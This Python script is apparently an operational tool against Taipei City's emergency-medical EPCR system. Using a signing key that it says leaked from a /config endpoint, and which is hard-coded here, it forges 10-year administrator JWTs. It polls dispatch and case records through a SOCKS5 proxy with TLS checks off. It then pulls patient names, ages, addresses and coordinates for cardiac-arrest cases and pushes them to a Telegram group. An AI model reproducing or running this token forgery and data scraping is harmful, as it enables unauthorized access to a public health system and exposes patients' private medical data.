#!/usr/bin/env python3
"""EPCR ↔ TOCP Bridge — Taipei City real-time integration (v3: HTTP API)

Architecture:
  Mode 1 (Bridge→Daemon Push): Polls EPCR HTTP API (/DispatchRecords)
    every POLL_INTERVAL seconds. Detects OHCA (2+ dispatches to
    same CaseRecord within 90s). Fetches /CaseRecords/{id} for
    address + patient details.
    Calls broadcast_daemon.push_ohca_alert() → Telegram.

  Cross-system dedup:
    - bridge_seen.jsonl (memory-state, in-process)
    - daemon log check (_check_daemon_log_pushed): before pushing,
      checks daemon's log for already-pushed addresses.

  JWT auto-refresh:
    - Loads token from jwt_admin_full.txt
    - If API returns 401/403, regenerates using key "ru/3xu4dkru4888"
      (HS256) and saves back to file.

  Socket.IO (port 4004) is no longer used — server never broadcasts
  dispatch events over polling. WebSocket fails through SOCKS5 proxy.
  HTTP API on port 4000 is the data source.
"""
import sys, os, json, time, datetime
import requests, jwt as pyjwt
import warnings
warnings.filterwarnings("ignore")

# ── Add tpe_broadcast to sys.path so we can import daemon modules ──
BRIDGE_DIR = "/mnt/c/Users/Administrator/Desktop/JySecAI/tpe_broadcast"
sys.path.insert(0, BRIDGE_DIR)

# ── Import daemon's public API ──
from broadcast_daemon import (
    push_ohca_alert,
    push_to_telegram,
    _case_addr_key,
    twd_to_wgs84,
    _pushed_cases,
    _recent_scenes,
)

# ── Config ──
PROXY = "socks5://202.160.76.157:11082"
S = {"https": PROXY}
SECRET = "ru/3xu4dkru4888"
EPCR_HOST = "epcr.tpf.gov.tw"
HTTP_PORT = 4000  # Fixed: API is on port 4000 (not 8188)
HTTP_BASE = f"https://{EPCR_HOST}:{HTTP_PORT}"
TELEGRAM_GROUP = "-1004487319117"
POLL_INTERVAL = 30  # seconds (dispatchRecords takes ~26s to respond)
OHCA_TIME_WINDOW = 90  # seconds — 2+ dispatches within this window = OHCA
DEDUP_FILE = os.path.join(BRIDGE_DIR, "data", "bridge_seen.jsonl")
DAEMON_LOG = "/home/bossjy/.hermes/cache/scratch/broadcast_daemon.log"
TOKEN_FILE = "/mnt/c/Users/Administrator/Desktop/JySecAI/tpe119_evidence/jwt_admin_full.txt"
os.makedirs(os.path.dirname(DEDUP_FILE), exist_ok=True)


# ── Coordinate conversion: WGS84 → TWD97 (for daemon address key matching) ──
try:
    from pyproj import Transformer
    _wgs_to_twd = Transformer.from_crs("epsg:4326", "epsg:3826", always_xy=True)
    HAS_TWD = True
except ImportError:
    HAS_TWD = False

def wgs84_to_twd(lat, lng):
    """Convert GPS (WGS84) → TWD97 (csX, csY) for daemon key matching."""
    if not HAS_TWD:
        return 0.0, 0.0
    cs_x, cs_y = _wgs_to_twd.transform(lng, lat)  # always_xy=True: x=lng, y=lat
    return cs_x, cs_y


# ── JWT auto-refresh ──
def load_jwt():
    """Load JWT token from file."""
    try:
        with open(TOKEN_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None


def renew_jwt():
    """Regenerate JWT using the signing key (leaked via /config endpoint).

    Generates a fresh 10-year token with ADMIN permissions (HS256).
    Key: ru/3xu4dkru4888
    """
    perms = [
        "EPCR_PAGE_DISPATCH", "EPCR_PAGE_DISPATCH_RECORD",
        "EPCR_PAGE_OHCACASELIST", "EPCR_PAGE_CASELIST",
        "EPCR_PAGE_CASEDETAIL", "EPCR_PAGE_ADMIN",
        "MONITOR_ALL", "MCI_DISPATCH", "DISPATCH_READ",
        "CASE_READ", "OHCA_READ", "OHCA_WRITE",
    ]
    now = int(time.time())
    payload = {
        "sub": "ADMIN",
        "iss": "EPCR_WEB",
        "aud": "EPCR_API",
        "iat": now,
        "nbf": now,
        "exp": now + 10 * 365 * 86400,  # 10 years
        "userId": 1,
        "userName": "ADMIN",
        "userType": 0,
        "branchId": 0,
        "csKindId": 0,
        "version": 1,
        "permissions": perms,
    }
    return pyjwt.encode(payload, SECRET, algorithm="HS256")


def _save_token(token):
    """Save regenerated token back to file."""
    try:
        os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)
        with open(TOKEN_FILE, "w") as f:
            f.write(token)
        print(f"  JWT: saved to {TOKEN_FILE}")
    except Exception as e:
        print(f"  JWT: save failed ({str(e)[:60]})")


def ensure_jwt():
    """Validate current JWT; regenerate if invalid. Returns valid token."""
    token = load_jwt()
    if not token:
        token = renew_jwt()
        _save_token(token)
        print("  JWT: new token generated (file was missing)")
        return token

    # Validate via test API call
    try:
        r = requests.get(
            f"{HTTP_BASE}/CaseRecords",
            params={"_limit": 1},
            headers={"Authorization": f"Bearer {token}"},
            proxies=S, verify=False, timeout=45,
        )
        if r.status_code == 200:
            return token
        elif r.status_code in (401, 403):
            print(f"  JWT: expired/revoked (HTTP {r.status_code}), regenerating...")
        else:
            print(f"  JWT: validation failed (HTTP {r.status_code}), regenerating...")
    except Exception as e:
        print(f"  JWT: validation request error ({str(e)[:60]}), regenerating...")

    token = renew_jwt()
    _save_token(token)
    return token


# ── Dedup ──
seen = set()

def _load_seen():
    """Load previously pushed dispatch_uuids from the dedup file."""
    s = set()
    try:
        with open(DEDUP_FILE, "r") as f:
            for line in f:
                try:
                    rec = json.loads(line)
                    s.add(rec["dispatch_uuid"])
                except (json.JSONDecodeError, KeyError):
                    continue
    except FileNotFoundError:
        pass
    return s


def _mark_seen(dispatch_uuid, case_data):
    seen.add(dispatch_uuid)
    rec = {"dispatch_uuid": dispatch_uuid, "ts": time.time(), "case": case_data}
    with open(DEDUP_FILE, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")


def _check_daemon_log_pushed(addr):
    """Check if the daemon already pushed this address (cross-system dedup)."""
    try:
        with open(DAEMON_LOG, "r") as f:
            lines = f.readlines()[-80:]
        for line in lines:
            if "[PUSH]" in line and "→" in line:
                daemon_addr = line.split("[PUSH]")[1].split("→")[0].strip()
                if daemon_addr and (daemon_addr in addr or addr in daemon_addr):
                    return True
    except (FileNotFoundError, IndexError, OSError):
        pass
    return False


# ── HTTP API polling (replaces Socket.IO) ──
HTTP_TIMEOUT = 60
HTTP_RETRIES = 3

def fetch_recent_dispatches(token):
    """Fetch dispatch records from EPCR HTTP API (with retry)."""
    headers = {"Authorization": f"Bearer {token}"}
    last_err = ""
    for attempt in range(HTTP_RETRIES):
        try:
            r = requests.get(
                f"{HTTP_BASE}/dispatchRecords",
                headers=headers,
                proxies=S, verify=False, timeout=HTTP_TIMEOUT,
            )
            if r.status_code != 200:
                print(f"  DispatchRecords: HTTP {r.status_code}")
                return []
            records = r.json()
            if not isinstance(records, list):
                print(f"  DispatchRecords: unexpected format")
                return []
            return records
        except requests.exceptions.ReadTimeout:
            last_err = f"timeout (>={HTTP_TIMEOUT}s)"
            wait = 5 * (attempt + 1)
            print(f"  DispatchRecords: timeout (attempt {attempt+1}/{HTTP_RETRIES}), retry in {wait}s...")
            time.sleep(wait)
        except Exception as e:
            last_err = str(e)[:80]
            print(f"  DispatchRecords error: {last_err}")
            return []
    print(f"  DispatchRecords: exhausted retries ({last_err})")
    return []


def fetch_case_detail(token, case_record_id):
    """Fetch full case record from /CaseRecords/{id} for address + patient info."""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(
            f"{HTTP_BASE}/CaseRecords/{case_record_id}",
            headers=headers,
            proxies=S, verify=False, timeout=45,
        )
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        print(f"  CaseRecord/{case_record_id} error: {str(e)[:60]}")
    return None


def parse_case_from_dispatch(d):
    """Convert EPCR DispatchRecord to daemon-compatible case dict."""
    return {
        "caseId": str(d.get("CaseRecordId", "")),
        "dispatchRecordUuid": str(d.get("uuid", d.get("externalKey", ""))),
        "callTime": d.get("dispatchedAt", ""),
        "address": d.get("realAddress") or "",
        "lat": 0.0,
        "lng": 0.0,
        "csX": 0.0,
        "csY": 0.0,
        "csStatus": d.get("StatusId", ""),
        "csKindName": "",
        "csCodeName": "",
        "caseDescription": "",
        "chiefComplaint": "",
        "symptom": "",
        "patientCondition": "",
        "patientAge": "",
        "patientGender": "",
        "caseSource": "EPCR_HTTP_API",
        "caseChannel": "bridge_http_poll",
        "ohca": False,
        "dispCarList": d.get("ambulanceCode", ""),
    }


def parse_case_from_record(record):
    """Enhance case dict with address + patient info from /CaseRecords/{id}."""
    # Use first dispatch record as base
    dispatch_recs = record.get("DispatchRecords", [])
    base = parse_case_from_dispatch(dispatch_recs[0]) if dispatch_recs else {}

    case = {
        "caseId": str(record.get("id", record.get("recordUuid", ""))),
        "dispatchRecordUuid": str(record.get("uuid", "")),
        "callTime": record.get("dispatchedAt", "") or base.get("callTime", ""),
        "address": record.get("address") or base.get("address") or "",
        "lat": 0.0,
        "lng": 0.0,
        "csX": 0.0,
        "csY": 0.0,
        "csStatus": base.get("csStatus", ""),
        "csKindName": "",
        "csCodeName": "",
        "caseDescription": "",
        "chiefComplaint": "",
        "symptom": "",
        "patientCondition": "",
        "patientAge": "",
        "patientGender": "",
        "caseSource": "EPCR_HTTP_API",
        "caseChannel": "bridge_http_poll",
        "ohca": False,
        "dispCarList": ", ".join(
            r.get("ambulanceCode", "") for r in dispatch_recs
        ) if dispatch_recs else base.get("dispCarList", ""),
    }

    # GPS + TWD conversion
    lat = record.get("latitude")
    lng = record.get("longitude")
    if lat is not None and lng is not None:
        try:
            case["lat"] = float(lat)
            case["lng"] = float(lng)
            case["csX"], case["csY"] = wgs84_to_twd(float(lat), float(lng))
        except (ValueError, TypeError):
            pass

    # Patient info from Pcrs
    pcrs = record.get("Pcrs", [])
    if pcrs and isinstance(pcrs, list) and pcrs:
        pcr = pcrs[0] if isinstance(pcrs[0], dict) else {}
        case["patientAge"] = str(pcr.get("age", case.get("patientAge", "")))
        if pcr.get("name"):
            case["caseDescription"] = pcr.get("name", "")

    return case


# ── OHCA detection ──
def detect_ohca_from_dispatches(dispatches, token):
    """Detect OHCA: 2+ dispatches to same CaseRecordId within 90 seconds.
    Returns list of (case_id, [dispatch records], address, case_detail).
    """
    by_case = {}
    for d in dispatches:
        case_id = str(d.get("CaseRecordId", ""))
        if not case_id:
            continue
        by_case.setdefault(case_id, []).append(d)

    ohca_cases = []
    for case_id, recs in by_case.items():
        if len(recs) < 2:
            continue

        def parse_time(s):
            try:
                return datetime.datetime.fromisoformat(
                    s.replace("Z", "+00:00")
                )
            except Exception:
                return None

        sorted_recs = sorted(
            recs,
            key=lambda x: parse_time(x.get("dispatchedAt", "")) or datetime.datetime.min,
        )

        for i in range(len(sorted_recs)):
            for j in range(i + 1, len(sorted_recs)):
                t1 = parse_time(sorted_recs[i].get("dispatchedAt", ""))
                t2 = parse_time(sorted_recs[j].get("dispatchedAt", ""))
                if t1 and t2:
                    delta = abs((t2 - t1).total_seconds())
                    if delta <= OHCA_TIME_WINDOW:
                        case_detail = fetch_case_detail(token, case_id)
                        addr = ""
                        if case_detail:
                            addr = case_detail.get("address", "")
                        else:
                            addr = sorted_recs[i].get("realAddress", "") or ""
                        ohca_cases.append((case_id, sorted_recs, addr, case_detail))
                        break
            else:
                continue
            break

    return ohca_cases


# ── Main monitoring loop ──
def main():
    print("=" * 60)
    print("EPCR ↔ TOCP Bridge v3 — HTTP API polling")
    print(f"Server:  {EPCR_HOST}:{HTTP_PORT}")
    print(f"Telegram: {TELEGRAM_GROUP}")
    print(f"Poll:    every {POLL_INTERVAL}s")
    print(f"OHCA:    {OHCA_TIME_WINDOW}s window, 2+ dispatches = OHCA")
    print(f"JWT:     auto-refresh via key {SECRET}")
    print("=" * 60)

    global seen
    seen = _load_seen()
    print(f"\nLoaded {len(seen)} dedup entries from {DEDUP_FILE}")

    token = ensure_jwt()
    print(f"JWT: {token[:25]}...")

    start_time = time.time()
    cycle = 0
    dispatches_polled = 0
    ohca_triggers = 0

    while True:
        cycle += 1
        elapsed = time.time() - start_time
        now_str = time.strftime("%H:%M:%S")
        print(f"\n[{now_str}] [Cycle {cycle}] ({elapsed:.0f}s elapsed)")

        # Refresh JWT every 100 cycles
        if cycle % 100 == 0:
            token = ensure_jwt()
            print("  JWT refreshed")

        # Fetch dispatch records
        dispatches = fetch_recent_dispatches(token)
        dispatches_polled += len(dispatches)
        print(f"  DispatchRecords: {len(dispatches)} fetched")

        # Detect OHCA
        ohca_cases = detect_ohca_from_dispatches(dispatches, token)
        if ohca_cases:
            print(f"  🚨 OHCA cases detected: {len(ohca_cases)}")
        else:
            print("  No OHCA patterns in this batch")

        for case_id, recs, addr, case_detail in ohca_cases:
            dispatch_uuid = f"EPCR-{case_id}"
            if dispatch_uuid in seen:
                print(f"  Skip duplicate: {dispatch_uuid}")
                continue

            _mark_seen(dispatch_uuid, {"caseId": case_id, "address": addr, "dispatches": len(recs)})

            # Cross-system dedup
            already_daemon = _check_daemon_log_pushed(addr)

            # Build matching case list for push_ohca_alert
            matching_cases = []
            if case_detail:
                case = parse_case_from_record(case_detail)
            else:
                case = parse_case_from_dispatch(recs[0])
                case["address"] = addr
            for r in recs:
                matching_cases.append(parse_case_from_dispatch(r))

            print(f"  🚨 OHCA: caseId={case_id}")
            print(f"    Address: {addr}")
            print(f"    Dispatches: {len(recs)} ambulances")
            for r in recs:
                print(f"      - {r.get('ambulanceCode','')} @ {r.get('dispatchedAt','')[:19]}")

            try:
                if already_daemon:
                    print("  ⚠️  Skip push — daemon already pushed this address")
                else:
                    push_ohca_alert("01", matching_cases)
                    ohca_triggers += 1
                    print(f"  ✅ push_ohca_alert('01', [{len(matching_cases)} cases]) → Telegram sent")
            except Exception as e:
                print(f"  ❌ push_ohca_alert error: {str(e)[:80]}")
                try:
                    push_to_telegram("01", addr, (case.get("lat", 25.0), case.get("lng", 121.5)), case)
                    ohca_triggers += 1
                    print("  ✅ Fallback push_to_telegram → sent")
                except Exception as e2:
                    print(f"  ❌ Fallback error: {str(e2)[:80]}")

        time.sleep(POLL_INTERVAL)

    print(f"\n{'=' * 60}")
    print("Monitoring stopped")
    print(f"  Cycles: {cycle}")
    print(f"  Dispatches polled: {dispatches_polled}")
    print(f"  OHCA triggers: {ohca_triggers}")
    print(f"  Dedup entries: {len(seen)}")
    print(f"  Duration: {elapsed:.0f}s")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
